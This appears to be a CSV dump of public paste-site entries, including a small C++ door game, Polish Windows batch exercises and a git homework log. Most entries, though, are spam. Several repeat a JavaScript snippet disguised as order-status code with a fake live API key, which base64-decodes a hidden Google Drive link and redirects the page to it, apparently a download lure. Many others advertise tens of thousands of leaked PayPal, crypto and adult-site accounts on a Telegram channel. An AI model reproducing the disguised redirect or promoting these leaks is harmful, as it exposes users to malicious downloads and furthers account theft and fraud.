id,title,username,language,date,content
y8Kfdn4N,Products.js,Xp_Isolation,JavaScript,Tuesday 29th of April 2025 05:39:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37024/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pKdp19hS,Leaked Accounts - Fresh Hits,rodrigomaise99,JavaScript,Tuesday 29th of April 2025 05:36:34 PM CDT,43266 Accounts Posted On https://t.me/leakzbyeminem
XeSSf11H,Order.js,Xp_Isolation,JavaScript,Tuesday 29th of April 2025 05:23:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/78056/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KFHnp4S7,Chaturbate with Tokens,rodrigomaise99,JavaScript,Tuesday 29th of April 2025 05:21:13 PM CDT,37615 Accounts Posted On https://t.me/leakzbyeminem
hhX4uAu5,Learn Python Programming - Beginner to Master,f0f077,Python,Tuesday 29th of April 2025 05:12:02 PM CDT,"Learn Python Programming - Beginner to Master
Become a Python Expert. for Both Academics and Industry. 100+ Challenges 
What you'll learn
Master Python Programming by doing 100+ Challenges
Detail understanding of fundamentals
Build Multithreaded Applications
using Python for Database Programming
Build GUI Applications 
for more:https://shrinkme.ink/bnscgn"
mCt2CRAA,Market.js,Xp_Isolation,JavaScript,Tuesday 29th of April 2025 05:08:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10053/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2LEduugT,Crypto Accounts,rodrigomaise99,JavaScript,Tuesday 29th of April 2025 05:05:51 PM CDT,00258 Accounts Posted On https://t.me/leakzbyeminem
nSb65fBV,The Complete Python Developer,f0f077,Python,Tuesday 29th of April 2025 04:58:28 PM CDT,"The Complete Python Developer
How to become a Python 3 Developer and get hired! Build 12+ projects, learn Web Development, Machine Learning + more! 
What you'll learn
Become a professional Python Developer and get hired
Master modern Python 3.13(latest) fundamentals as well as advanced topics 
for more:https://cuty.io/1ChRZ"
NZpJwEuU,Untitled,Xp_Isolation,JavaScript,Tuesday 29th of April 2025 04:53:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68026/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YuakiyQC,PayPal with Balance,rodrigomaise99,JavaScript,Tuesday 29th of April 2025 04:50:30 PM CDT,69380 Accounts Posted On https://t.me/leakzbyeminem
iBGPvDwe,Untitled,rodrigomaise99,JavaScript,Tuesday 29th of April 2025 04:37:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32505/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GJACejX9,PayPal with Balance,x2LeaF,JavaScript,Tuesday 29th of April 2025 04:35:03 PM CDT,69823 Accounts Posted On https://t.me/leakzbyeminem
ReuKH6qZ,Products.js,rodrigomaise99,JavaScript,Tuesday 29th of April 2025 04:22:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34791/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xJ1NDuQM,Leaked Accounts - Fresh Hits,x2LeaF,JavaScript,Tuesday 29th of April 2025 04:19:41 PM CDT,68056 Accounts Posted On https://t.me/leakzbyeminem
BKR4QQp2,C++ Choose a Door,shadowlucario50,C++,Tuesday 29th of April 2025 04:17:37 PM CDT,"#include <iostream>
#include <ctime>
#include <cmath>
#include <iomanip>
#include <climits>

//Make a code with 3 CPUs. Choose a door and try to get a door none of the CPUs choose. Add a new door each round until the player wins.

int cpu(int door);
int door(int round);
void doorCount(int door);
bool doorCheck(int doorChoice, int cpuDoor);
void cpuStillAlive(bool cpu, int cpuDoor, int cpuNum);

int main() {

    srand(time(0));

    int round = 1;
    int doors = 0;
    int doorChoice = 0;
    int cpu1door = 0;
    int cpu2door = 0;
    int cpu3door = 0;
    bool cpu1 = true;
    bool cpu2 = true;
    bool cpu3 = true;

    std::cout << ""**Welcome to Choose a Door!**\n\n"";
    std::cout << ""Rules: Choose a door and eliminate all the CPUs before time runs out!\n"";

    do{
        doors = door(round);
        
        std::cout << '\n';

        if(doors == 1) {
            break;
        }

        if(doors > 2){
            std::cout << ""Round "" << round << ""!\n"";
        }
        else if(doors == 2){
            std::cout << ""Final Round!\n"";
        }

        

        doorCount(doors);
        do {
            std::cin >> doorChoice;
            std::cin.clear();
            std::cin.ignore(INT_MAX,'\n');
        }while (doorChoice < 1 || doorChoice > doors);
        
        
        
        if(cpu1 == true) {
            cpu1door = cpu(doors);
            cpu1 = doorCheck(doorChoice,cpu1door);
            cpuStillAlive(cpu1, cpu1door, 1);
        }
        
        if(cpu2 == true) {
            cpu2door = cpu(doors);
            cpu2 = doorCheck(doorChoice,cpu2door);
            cpuStillAlive(cpu2, cpu2door, 2);
        }
        
        if(cpu3 == true) {
            cpu3door = cpu(doors);
            cpu3 = doorCheck(doorChoice,cpu3door);
            cpuStillAlive(cpu3, cpu3door, 3);
        }

        if(cpu1 == true || cpu2 == true || cpu3 == true){
            round++;
        }

    }while(cpu1 == true || cpu2 == true || cpu3 == true);
    
    if(cpu1 == true || cpu2 == true || cpu3 == true) {
        std::cout << ""\nCPUs win!"";
    }
    else {
        std::cout << ""\nPlayer wins!"";
    }
    
    return 0;
}

int cpu(int door) {
    int doorChoice;

    doorChoice = rand() % door + 1;
    
    return doorChoice;
}

int door(int round) {
    int door;

    //Start with 10 Doors
    //Subtract a door each round.
    for(int i = 1; i <= (11 - round); i++){
        door = i;
    }
    
    return door;
}

void doorCount(int door) {
    for(int i = 1; i <= door; i++){
        if(i % 3 != 0) {
            std::cout << i << "": Door "" << i << '\t';
        }
        else{
            std::cout << i << "": Door "" << i << '\n';
        }
    }
}

bool doorCheck(int doorChoice, int cpuDoor) {
    bool cpuSafe = true;
    
    if(doorChoice == cpuDoor) {
        cpuSafe = false;
    }
    
    return cpuSafe;
}

void cpuStillAlive(bool cpu, int cpuDoor, int cpuNum){
    std::cout << ""CPU "" << cpuNum << "" chose "" << cpuDoor << ""! "";
    
    if(cpu == true) {
        std::cout << ""CPU "" << cpuNum << "" is still in!\n"";
    }
    else{
        std::cout << ""CPU "" << cpuNum << "" is out!\n"";
    }
}

"
P2EZdnZd,Order.js,rodrigomaise99,JavaScript,Tuesday 29th of April 2025 04:06:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37751/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aT2XUDyg,Chaturbate with Tokens,x2LeaF,JavaScript,Tuesday 29th of April 2025 04:04:19 PM CDT,77640 Accounts Posted On https://t.me/leakzbyeminem
2VeV3mJ9,windows 2 skrypty cwelowe,ENCIOK,Batch,Tuesday 29th of April 2025 03:59:18 PM CDT,"@echo off
chcp 65001

set /p folder=""nazwa folderu: ""
set /p plik1=""nazwa pierwszego skryptu: ""
set /p plik2=""nazwa drugiego skryptu: ""
mkdir %folder%
cd %folder%
(
    echo @echo off
    echo chcp 65001
    echo echo to jest skrypt o nazwie: %plik1%
    echo pause
) > %plik1%

(
    echo @echo off
    echo chcp 65001
    echo echo to jest inny skrypt o nazwie %plik2%
    echo pause
) > %plik2%

:while
cls
    echo ""co chcerz zrobić?""
    echo 1) odpal %plik1%
    echo 2) odpal %plik2%
    echo 3) koniec
    set /p ""wybor=: ""
    if %wybor%==1 (
        call %plik1%
    )
    if %wybor%==2 (
        call %plik2%
    )
    if %wybor%==3 (
        goto :endloop
    )
goto :while

:endloop"
ukifWU0M,Untitled,mvsil,Bash,Tuesday 29th of April 2025 03:55:56 PM CDT,"yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (master)
$ git status
On branch master

No commits yet

Untracked files:
  (use ""git add <file>..."" to include in what will be committed)
        Elevator_Mind_[Nazar]_[Yusin].xmind
        Test_Stand_Test_Report-[april]-[05_-[Nazar]-[Yusin].xlsx
        Traceability_Matrix_CoffeeMachine_Nazar_Yusin.xlsx
        Traceability_Matrix_Cooler_Nazar_Yusin.xlsx

nothing added to commit but untracked files present (use ""git add"" to track)

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (master)
$ pwd
/c/Users/yusin/OneDrive/Рабочий стол/MyProject/homework/homework

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (master)
$ git status
On branch master

No commits yet

Untracked files:
  (use ""git add <file>..."" to include in what will be committed)
        Elevator_Mind_[Nazar]_[Yusin].xmind
        Test_Stand_Test_Report-[april]-[05_-[Nazar]-[Yusin].xlsx
        Traceability_Matrix_CoffeeMachine_Nazar_Yusin.xlsx
        Traceability_Matrix_Cooler_Nazar_Yusin.xlsx

nothing added to commit but untracked files present (use ""git add"" to track)

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (master)
$ git add .

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (master)
$ git status
On branch master

No commits yet

Changes to be committed:
  (use ""git rm --cached <file>..."" to unstage)
        new file:   Elevator_Mind_[Nazar]_[Yusin].xmind
        new file:   Test_Stand_Test_Report-[april]-[05_-[Nazar]-[Yusin].xlsx
        new file:   Traceability_Matrix_CoffeeMachine_Nazar_Yusin.xlsx
        new file:   Traceability_Matrix_Cooler_Nazar_Yusin.xlsx


yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (master)
$ git add ""Elevator_MIND_[Nazar]_[Yusin].xmind""
git add ""Test_Stand_Test_Report-[april]-[05]_[Nazar]_[Yusin].xlsx""
fatal: pathspec 'Test_Stand_Test_Report-[april]-[05]_[Nazar]_[Yusin].xlsx' did not match any files

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (master)
$ git commit -m ""Add homework files for module1_lesson4_Nazar_Yusin""
[master (root-commit) 84ba284] Add homework files for module1_lesson4_Nazar_Yusin
 4 files changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 Elevator_Mind_[Nazar]_[Yusin].xmind
 create mode 100644 Test_Stand_Test_Report-[april]-[05_-[Nazar]-[Yusin].xlsx
 create mode 100644 Traceability_Matrix_CoffeeMachine_Nazar_Yusin.xlsx
 create mode 100644 Traceability_Matrix_Cooler_Nazar_Yusin.xlsx

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (master)
$ git remote add origin https://gitlab.com/KNV_konva/homework/module1_lesson4_Nazar_Yusin.git

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (master)
$ git branch -m master main

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (main)
$ git push origin main
remote: The project you were looking for could not be found or you don't have permission to view it.
fatal: repository 'https://gitlab.com/KNV_konva/homework/module1_lesson4_Nazar_Yusin.git/' not found

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (main)
$ git remote rm origin

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (main)
$ git remote add origin https://gitlab.com/KNV_konva/homework.git

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (main)
$ git checkout module1_lesson4_Nazar_Yusin
error: pathspec 'module1_lesson4_Nazar_Yusin' did not match any file(s) known to git

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (main)
$ git fetch origin
git branch -r
remote: Enumerating objects: 14, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 14 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Unpacking objects: 100% (14/14), 28.29 KiB | 673.00 KiB/s, done.
From https://gitlab.com/KNV_konva/homework
 * [new branch]      main       -> origin/main
 * [new branch]      module1_lesson4_Nazar_Yusin -> origin/module1_lesson4_Nazar_Yusin
  origin/HEAD -> origin/main
  origin/main
  origin/module1_lesson4_Nazar_Yusin

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (main)
$ git checkout module1_lesson4_Nazar_Yusin
branch 'module1_lesson4_Nazar_Yusin' set up to track 'origin/module1_lesson4_Nazar_Yusin'.
Switched to a new branch 'module1_lesson4_Nazar_Yusin'

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (module1_lesson4_Nazar_Yusin)
$ git status
On branch module1_lesson4_Nazar_Yusin
Your branch is up to date with 'origin/module1_lesson4_Nazar_Yusin'.

nothing to commit, working tree clean

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (module1_lesson4_Nazar_Yusin)
$ git add .

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (module1_lesson4_Nazar_Yusin)
$ git commit -m ""Add homework files for module1_lesson4_Nazar_Yusin""
On branch module1_lesson4_Nazar_Yusin
Your branch is up to date with 'origin/module1_lesson4_Nazar_Yusin'.

nothing to commit, working tree clean

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (module1_lesson4_Nazar_Yusin)
$ git log --oneline
063fa30 (HEAD -> module1_lesson4_Nazar_Yusin, origin/module1_lesson4_Nazar_Yusin) Add homework files for module1_lesson4_Nazar_Yusin
8b019c0 Merge branch 'main' of https://gitlab.com/Knv_konva/homework
9bb1d45 Add local README.md
101f1f3 (origin/main, origin/HEAD) Initial commit

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (module1_lesson4_Nazar_Yusin)
$ git push origin module1_lesson4_Nazar_Yusin
Everything up-to-date

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (module1_lesson4_Nazar_Yusin)
$  new file:   Elevator_Mind_[Nazar]_[Yusin].xmind
        new file:   Test_Stand_Test_Report-[april]-[05_-[Nazar]-[Yusin].xlsx^C

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (module1_lesson4_Nazar_Yusin)
$ git status
On branch module1_lesson4_Nazar_Yusin
Your branch is up to date with 'origin/module1_lesson4_Nazar_Yusin'.

Untracked files:
  (use ""git add <file>..."" to include in what will be committed)
        homework/Test_Stand_Test_Report-[april]-[05_-[Nazar]-[Yusin].xlsx
        homework/~$Test_Stand_Test_Report-[april]-[05_-[Nazar]-[Yusin].xlsx

nothing added to commit but untracked files present (use ""git add"" to track)

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (module1_lesson4_Nazar_Yusin)
$ ^C

yusin@DESKTOP-0HTBEV2 MINGW64 ~/OneDrive/Рабочий стол/MyProject/homework/homework (module1_lesson4_Nazar_Yusin)
$
"
we1A8qtn,Market.js,rodrigomaise99,JavaScript,Tuesday 29th of April 2025 03:51:28 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53493/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
in20iZ5B,Crypto Accounts,x2LeaF,JavaScript,Tuesday 29th of April 2025 03:48:57 PM CDT,04196 Accounts Posted On https://t.me/leakzbyeminem
23wHdKZL,windows icacwel,ENCIOK,Batch,Tuesday 29th of April 2025 03:44:32 PM CDT,"@echo off

chcp 65001

set /p folder=""nazwa folderu: ""
set /p plik=""nazwa pliku: ""
set /p content=""zawartość: ""
set /p uzytk=""nazwa użytkownika: ""
mkdir %folder%
cd %folder%
echo %content% > %plik%

dir
icacls %plik% /inheritancelevel:r
icacls %plik% /grant system:F Administrators:F %uzytk%:(RX,W)
icacls %plik%

pause"
ApaRH31P,PayPal with Balance,x2LeaF,JavaScript,Tuesday 29th of April 2025 03:33:34 PM CDT,64297 Accounts Posted On https://t.me/leakzbyeminem
ECCcQLgG,Order.js,x2LeaF,JavaScript,Tuesday 29th of April 2025 03:20:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08416/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FngQk85u,windows dodaje grupe,ENCIOK,Batch,Tuesday 29th of April 2025 03:18:30 PM CDT,"@echo off

chcp 65001

set /p nazwa=""nazwa: ""
set /p komentarz=""komentarz: ""

echo dodawanie...
net localgroup %nazwa% /add /comment:""%komentarz%""
net localgroup
pause"
pqCzrnjh,Chaturbate with Tokens,hubertzoo90,JavaScript,Tuesday 29th of April 2025 03:17:56 PM CDT,60765 Accounts Posted On https://t.me/leakzbyeminem
QAJvgp3S,Market.js,x2LeaF,JavaScript,Tuesday 29th of April 2025 03:05:19 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48880/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
S41wd5K7,Crypto Accounts,hubertzoo90,JavaScript,Tuesday 29th of April 2025 03:02:29 PM CDT,21041 Accounts Posted On https://t.me/leakzbyeminem
